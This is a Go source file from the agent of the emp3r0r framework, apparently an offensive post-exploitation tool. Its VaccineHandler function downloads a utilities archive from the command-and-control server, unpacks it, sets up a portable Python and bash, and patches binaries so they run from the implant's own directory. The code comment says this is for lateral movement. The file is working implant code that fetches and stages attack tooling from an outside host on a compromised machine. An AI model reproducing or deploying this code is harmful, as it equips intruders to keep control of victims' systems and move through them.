//go:build linux
// +build linux

package modules

/*
install tools to common.RuntimeConfig.UtilsPath, for lateral movement
*/

import (
	"fmt"
	"log"
	"os"

	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/exeutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func VaccineHandler(download_addr, checksum string) (out string) {
	const UtilsArchive = "utils.tar.xz"
	var (
		PythonArchive = common.RuntimeConfig.UtilsPath + "/python3.tar.xz"
		PythonLib     = common.RuntimeConfig.UtilsPath + "/python3.11"
		PythonPath    = fmt.Sprintf("%s:%s:%s", PythonLib, PythonLib+"/lib-dynload", PythonLib+"/site-packages")
		PythonCmd     = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s "+
			"LD_LIBRARY_PATH=%s/lib %s ",
			PythonPath, PythonLib,
			common.RuntimeConfig.UtilsPath, common.RuntimeConfig.UtilsPath+"/python3")
		PythonLauncher   = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", def.DefaultShell, PythonCmd)
		UtilsArchivePath = common.RuntimeConfig.AgentRoot + "/" + UtilsArchive
	)

	// do not download if already downloaded
	if util.IsFileExist(UtilsArchivePath) && crypto.SHA256SumFile(UtilsArchivePath) == checksum {
		log.Printf("%s already exists, skipping download", UtilsArchivePath)
	}

	log.Printf("Downloading utils from %s", def.CCAddress+"www/"+UtilsArchive)
	_, err := c2transport.SmartDownload(download_addr, UtilsArchive, UtilsArchivePath, checksum)
	out = "[+] Utils have been successfully installed"
	if err != nil {
		log.Print("Utils error: " + err.Error())
		out = "[-] Download error: " + err.Error()
		return
	}

	// unpack utils.tar.xz to our PATH
	extractPath := common.RuntimeConfig.UtilsPath
	if err = util.Unarchive(UtilsArchivePath, extractPath); err != nil {
		log.Printf("Unarchive: %v", err)
		return fmt.Sprintf("Unarchive: %v", err)
	}
	log.Printf("%s extracted", UtilsArchive)

	// unpack libs
	if err = util.Unarchive(common.RuntimeConfig.UtilsPath+"/libs.tar.xz", extractPath); err != nil {
		log.Printf("Unarchive: %v", err)
		out = fmt.Sprintf("Unarchive libs: %v", err)
		return
	}
	log.Println("Libs configured")
	defer os.Remove(common.RuntimeConfig.UtilsPath + "/libs.tar.xz")

	// extract python3.9.tar.xz
	log.Printf("Pre-set Python environment: %s, %s, %s", PythonArchive, PythonLib, PythonPath)
	os.RemoveAll(PythonLib)
	log.Printf("Found python archive at %s, trying to configure", PythonArchive)
	defer os.Remove(PythonArchive)
	if err = util.Unarchive(PythonArchive, extractPath); err != nil {
		out = fmt.Sprintf("Unarchive python libs: %v", err)
		log.Print(out)
		return
	}

	// create launchers
	err = util.WriteFileAgent(common.RuntimeConfig.UtilsPath+"/python", []byte(PythonLauncher), 0o755)
	if err != nil {
		out = fmt.Sprintf("Write python launcher: %v", err)
	}
	log.Println("Python configured")

	// fix ELFs
	files, err := os.ReadDir(common.RuntimeConfig.UtilsPath)
	if err != nil {
		return fmt.Sprintf("Fix ELFs: %v", err)
	}
	for _, f := range files {
		fpath := fmt.Sprintf("%s/%s", common.RuntimeConfig.UtilsPath, f.Name())
		if !exeutil.IsELF(fpath) || exeutil.IsStaticELF(fpath) {
			continue
		}
		// patch patchelf itself
		old_path := fpath // save original path
		if f.Name() == "patchelf" {
			new_path := fmt.Sprintf("%s/%s.tmp", common.RuntimeConfig.UtilsPath, f.Name())
			err = util.Copy(fpath, new_path)
			if err != nil {
				continue
			}
			fpath = new_path
		}

		rpath := fmt.Sprintf("%s/lib/", common.RuntimeConfig.UtilsPath)
		ld_path := fmt.Sprintf("%s/ld-musl-x86_64.so.1", rpath)
		err = exeutil.FixELF(fpath, rpath, ld_path)
		if err != nil {
			out = fmt.Sprintf("%s\n%s: %v", out, fpath, err)
		}

		// remove tmp file
		if f.Name() == "patchelf" {
			err = os.Rename(fpath, old_path)
			if err != nil {
				out = fmt.Sprintf("%s, %s: %v", out, fpath, err)
			}
		}
	}

	log.Println("ELFs configured")

	// set DefaultShell
	custom_bash := fmt.Sprintf("%s/bash", common.RuntimeConfig.UtilsPath)
	if util.IsFileExist(custom_bash) {
		def.DefaultShell = custom_bash
	}

	return
}
